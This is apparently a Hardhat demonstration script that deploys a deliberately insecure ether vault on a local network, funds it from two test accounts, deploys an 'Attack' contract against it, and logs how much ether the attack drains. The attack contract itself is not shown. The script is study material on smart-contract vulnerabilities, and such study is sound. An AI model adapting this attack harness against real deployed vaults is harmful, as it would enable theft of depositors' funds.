import { ethers } from "hardhat";

async function main() {
    console.log("\n\n");
    const [deployer, signer1, signer2, signer3] = await ethers.getSigners();
    const vaultFactory = await ethers.getContractFactory("InsecureEtherVault");
    const vault = await vaultFactory.deploy();
    const vaultAddress = await vault.getAddress();
    console.log(` vault contract deployed at address ${vaultAddress}`);


    vault.on("WithdrawAllEvent", (user, amount) => {
        console.log(`WithdrawAllEvent: user: ${user}, amount: ${amount}`);
    })

    console.log("---- user1 and user2 deposit 3 and 2 ethers respectively ----");
    const depositAmount = ethers.parseEther("1.0");
    await vault.connect(signer1).deposit({ value: depositAmount+depositAmount+depositAmount });
    await vault.connect(signer2).deposit({ value: depositAmount+depositAmount });

    console.log(`insecureEtherVault.getUserBalance(signer1) : ${await vault.getUserBalance(signer1.address)}`);
    console.log(`insecureEtherVault.getUserBalance(signer2) : ${await vault.getUserBalance(signer2.address)}`);
    console.log("\n\n");


    const attackFactory = await ethers.getContractFactory("Attack");
    const attack = await attackFactory.deploy(vault.target);
    const attackAddress = await attack.getAddress();
    console.log(`---- deploy the attack ----`);
    console.log(`attack.address :  ${attackAddress}`)
    console.log("\n\n");

    console.log("---- attack's Ether before attacking ----")
    console.log(`attack.getBalance() : ${await attack.getBalance()}`);	
    console.log("\n\n");

    console.log("---- vault's Ether before attacking ----")
    console.log(`vault.getBalance() : ${await vault.getBalance()}`);	
    console.log("\n\n");

    console.log("---- perform the attack ----")
    await attack.attack({ value: depositAmount });



    console.log("---- attack's Ether after attacking ----")
    console.log(`attack.getBalance() : ${await attack.getBalance()}`);	
    console.log("\n\n");

    console.log("---- vault's Ether after attacking ----")
    console.log(`vault.getBalance() : ${await vault.getBalance()}`);	
    console.log("\n\n");

}



main();